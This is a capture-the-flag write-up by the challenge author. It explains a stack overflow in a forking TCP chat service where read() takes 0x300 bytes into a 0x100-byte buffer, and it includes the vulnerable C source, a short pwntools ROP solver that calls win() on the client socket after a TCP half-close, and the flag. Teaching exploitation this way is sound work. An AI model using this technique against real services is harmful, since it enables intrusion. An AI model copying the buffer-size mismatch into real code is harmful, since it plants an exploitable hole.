---
title: "Au Revoir"
area: the-stack
role: author
event: friendly-2026
published: 2026-09-29
summary: "A TCP chat service overflows in a loop; half-closing the socket forces a return into a ROP call to the binary's own win()."
techniques: ["stack overflow", "ROP", "ret2win", "TCP half-close"]
difficulty: medium
arch: amd64
flag: "Securinets{th3_gr33t1ng_l34k3d_ur_fd_4u_r3v01r}"
---

> Category: **pwn** — Tag: **rop**
> Flag: `Securinets{th3_gr33t1ng_l34k3d_ur_fd_4u_r3v01r}`

This challenge doesn't run over stdin/stdout like the others — the binary
opens its *own* raw TCP socket internally, and the bug is a plain stack
buffer overflow hiding inside a polite little chat loop.

## 1. The program

```c
void win(int client_fd){
    puts("b");
    char flag[0x100];
    int fd = open("flag.txt", O_RDONLY);
    read(fd, flag, sizeof(flag)-2);
    close(fd);
    send(client_fd, flag, strlen(flag), 0);   // sends the flag back over the socket
}

void gadget(){
    __asm__("pop %rdi;ret;");                 // a "pop rdi; ret" gadget, in case we need it
}

void vuln(){
    // ... sets up a TCP server on port 5000 ...
    while(1){
        client_fd = accept(server_fd, NULL, NULL);
        pid_t p = fork();
        if (p == 0) {
            char buf[0x100];                          // <-- only 0x100 bytes!
            for(;;){
                sprintf(wlc, "Bonjour\n");
                send(client_fd, wlc, strlen(wlc), 0);
                if (!(read(client_fd, buf, 0x300) > 0)) {   // <-- but reads up to 0x300!
                    send(client_fd, "Au revoir VYHVF\n", ..., 0);
                    break;
                }
            }
            return;                                    // <-- overflowed return address fires here
        }
        close(client_fd);
    }
}
```

The bug is right there in plain sight: `buf` is declared as `char
buf[0x100]` (256 bytes), but every `read(client_fd, buf, 0x300)` call is
allowed to write up to `0x300` (768) bytes into it. That's a **512-byte
stack buffer overflow**, easily enough to smash past `buf`, past the saved
registers, and overwrite the **saved return address** on the stack.

Conveniently, the binary also ships its own `win()` function that reads
`flag.txt` and sends it back over whatever file descriptor it's given —
and a bare-bones `pop rdi; ret` `gadget()` function, practically inviting a
**ret2win via ROP**.

## 2. Why "one iteration" isn't enough by itself

The vulnerable `read()` sits inside a `for(;;)` loop. Overflowing `buf`
during a `read()` call that returns *more than 0 bytes* doesn't trigger
anything yet — the loop just goes around again (prints `"Bonjour"` again,
waits for more input). The overflowed return address only actually gets
**popped off the stack and executed** once the function *returns*, and the
only way this function returns is if `read()` returns `<= 0` — i.e. the
client side of the socket is closed or errors out, so `break` fires and
the `for(;;)` loop's enclosing block does its implicit `return;`.

So the exploit needs exactly two steps:
1. Send the overflow payload (a `read()` that succeeds, filling `buf` and
   overwriting the return address).
2. **Deliberately end the read stream** so the *next* `read()` call
   returns `0`/error, forcing the loop to break and the function to
   return — which is when our overwritten return address takes over.

## 3. The exploit — `solver.py`

```python
poprdi = 0x4012b7
win = 0x401226 + 1
fd = 4

payload = b"a"*0x238 + p64(poprdi) + p64(fd) + p64(win)
# ROP we need to call win(client_fd)

p.send(payload)
p.shutdown("send")   # cut half way tcp connection to fail read() but still recv data

p.interactive()
```

- **`b"a"*0x238`** — junk padding, exactly enough bytes to fill `buf` and
  every stack slot up to (but not including) the saved return address.
  (`0x238` was determined empirically — e.g. with a cyclic pattern in GDB —
  same as the other challenges in this set.)
- **`p64(poprdi)`** — overwrites the return address with the address of a
  `pop rdi; ret` gadget. When the function "returns," control jumps here
  instead: it pops the *next* 8 bytes off the stack into the `rdi`
  register (the first argument register in the x86-64 calling convention),
  then `ret`s again — continuing the chain.
- **`p64(fd)`** — the value popped into `rdi`. `fd = 4` because file
  descriptors are handed out sequentially by the kernel: `0`/`1`/`2` are
  stdin/stdout/stderr, `3` is the listening `server_fd` from `socket()`,
  and `4` is the very next one — the `client_fd` returned by `accept()`
  for our connection, inside the forked child. So `rdi = 4` sets up
  `win`'s single argument (`win(int client_fd)`) to be *our own socket*.
- **`p64(win)`**, where `win = 0x401226 + 1` — the next return address,
  landing one byte **into** `win()` rather than at its very first
  instruction. This is a common ROP alignment trick: skipping the first
  byte of a function's prologue can be used to land past an instruction
  that would otherwise misalign the stack (or duplicate/skip a push) for a
  clean `ret`-based call rather than a real `call`. The important result:
  execution ends up inside `win()` with `rdi` already holding our
  `client_fd`.
- **`p.shutdown("send")`** — this is the "force the next `read()` to fail"
  step described above. `shutdown("send")` closes only the *write* half of
  our TCP connection (a "half-close"), sending a `FIN` to the server. The
  server's next `read(client_fd, buf, 0x300)` then sees end-of-stream and
  returns `0`, satisfying `!(read(...) > 0)` — the loop breaks, the
  function returns, and our ROP chain fires. Crucially, half-closing only
  the send direction means we can *still receive* data afterward — exactly
  what we need, since `win()` is about to `send()` the flag back to us.

## 4. Running it

```bash
python3 solver.py
```
The forked child pops a `pop rdi; ret` gadget with `rdi=4` (our own
socket), jumps into `win(client_fd)`, which reads `flag.txt` and sends its
contents straight back down the same connection we're still listening on.

## 5. Lesson

A "size mismatch" bug — declaring a buffer one size but `read()`-ing a
larger size — is one of the most classic (and classically dangerous) C
mistakes. Combined with a network service that keeps a request loop alive
across multiple `read()`s on the *same* stack frame, the attacker doesn't
even need the overflow to trigger a return immediately — they can overflow
first, then choose exactly when to make the function return (here, via a
TCP half-close) to fire the ROP chain on their own schedule.
